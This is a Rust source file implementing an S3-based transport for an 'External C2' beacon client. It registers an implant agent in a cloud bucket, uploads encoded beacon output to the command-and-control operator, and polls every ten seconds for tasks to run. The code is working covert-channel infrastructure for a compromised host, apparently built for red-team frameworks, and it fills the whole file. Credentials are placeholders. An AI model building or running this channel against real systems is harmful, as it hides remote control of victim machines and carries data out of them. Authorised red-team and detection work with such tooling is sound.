//! S3-based transport layer for the External C2 client.
//!
//! All S3 interaction details (credentials, encoding, bucket operations) are
//! encapsulated here.  Only three functions are exported for use by `main.rs`:
//!
//! - [`register_beacon`] – register a new agent with the C2
//! - [`send_data`]       – send data (beacon → C2) via S3
//! - [`recv_data`]       – receive tasks (C2 → beacon) via S3

use std::time::Duration;

use s3::bucket::Bucket;
use s3::creds::Credentials;
use s3::Region;
use tokio::time::sleep;
use uuid::Uuid;

use crate::utils::{data_encode, data_decode};

// ── Configuration ───────────────────────────────────────────────────────────

const AWS_SECRET_KEY: &str = "YOUR-SECRET-KEY";
const AWS_ACCESS_KEY: &str = "YOUR=ACCESS-KEY";
const AWS_BUCKET_NAME: &str = "S3-BUCKET-NAME";
const AWS_REGION: &str = "S3-BUCKET-REGION";

// ── Internal S3 client ──────────────────────────────────────────────────────

#[derive(Clone)]
struct S3Client {
    bucket: Box<Bucket>,
}

impl S3Client {
    fn new_hardcoded(
        bucket_name: &str,
        region: &str,
        ak: &str,
        sk: &str,
        session_token: Option<&str>,
    ) -> Result<Self, Box<dyn std::error::Error>> {
        let region: Region = region.parse()?;
        let creds = Credentials::new(Some(ak), Some(sk), session_token, None, None)?;
        let bucket: Box<Bucket> = Bucket::new(bucket_name, region, creds)?.with_path_style();
        Ok(Self { bucket })
    }

    async fn put_object(&self, key: &str, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let resp = self.bucket.put_object(key, data).await?;
        if resp.status_code() / 100 != 2 {
            return Err(format!("put_object failed: HTTP {}", resp.status_code()).into());
        }
        Ok(())
    }

    async fn get_object(&self, key: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let resp = self.bucket.get_object(key).await?;
        if resp.status_code() / 100 != 2 {
            return Err(format!("get_object failed: HTTP {}", resp.status_code()).into());
        }
        Ok(resp.bytes().to_vec())
    }

    async fn list_objects(&self, prefix: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let pages = self.bucket.list(prefix.to_string(), None).await?;
        let mut keys = Vec::new();
        for page in pages {
            for obj in page.contents {
                keys.push(obj.key);
            }
        }
        Ok(keys)
    }

    async fn delete_object(&self, key: &str) -> Result<(), Box<dyn std::error::Error>> {
        let resp = self.bucket.delete_object(key).await?;
        if resp.status_code() / 100 != 2 {
            return Err(format!("delete_object failed: HTTP {}", resp.status_code()).into());
        }
        Ok(())
    }
}

// ── Transport handle ────────────────────────────────────────────────────────

/// Opaque handle that holds the S3 client and the key-name prefixes derived
/// from the beacon ID.  Created by [`register_beacon`] and passed into
/// [`send_data`] / [`recv_data`].
pub struct S3Transport {
    s3: S3Client,
    task_key_name: String,
    resp_key_name: String,
}

// ── Public API (only 3 functions) ───────────────────────────────────────────

/// Register a new beacon agent with the C2 server via S3.
///
/// Returns an [`S3Transport`] handle that must be passed to [`send_data`] and
/// [`recv_data`].
pub async fn register_beacon(beacon_id: &str) -> Result<S3Transport, Box<dyn std::error::Error>> {
    let s3 = S3Client::new_hardcoded(
        AWS_BUCKET_NAME,
        AWS_REGION,
        AWS_ACCESS_KEY,
        AWS_SECRET_KEY,
        None,
    )?;

    let key_name = format!("AGENT:{beacon_id}");
    s3.put_object(&key_name, b"").await?;
    println!("[+] s3: Registering new agent {}", key_name);

    let task_key_name = format!("{beacon_id}:TaskForYou");
    let resp_key_name = format!("{beacon_id}:RespForYou");

    Ok(S3Transport {
        s3,
        task_key_name,
        resp_key_name,
    })
}

/// Send data (typically a beacon response chunk) to the C2 server via S3.
pub async fn send_data(transport: &S3Transport, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let resp_key = format!("{}:{}", transport.resp_key_name, Uuid::new_v4());
    let body = data_encode(data);
    transport.s3.put_object(&resp_key, body.as_bytes()).await?;
    Ok(())
}

/// Receive task data from the C2 server via S3.
///
/// Blocks (polling every 10 s) until at least one task object appears, then
/// returns all available tasks as a `Vec<Vec<u8>>`.
pub async fn recv_data(transport: &S3Transport) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    loop {
        let keys = transport.s3.list_objects(&transport.task_key_name).await?;

        if keys.is_empty() {
            sleep(Duration::from_secs(10)).await;
            continue;
        }

        let mut tasks: Vec<Vec<u8>> = Vec::new();

        for key in keys {
            let raw = transport.s3.get_object(&key).await?;
            let raw_str = std::str::from_utf8(&raw)?;
            let msg = data_decode(raw_str)?;
            transport.s3.delete_object(&key).await?;
            tasks.push(msg);
        }

        return Ok(tasks);
    }
}
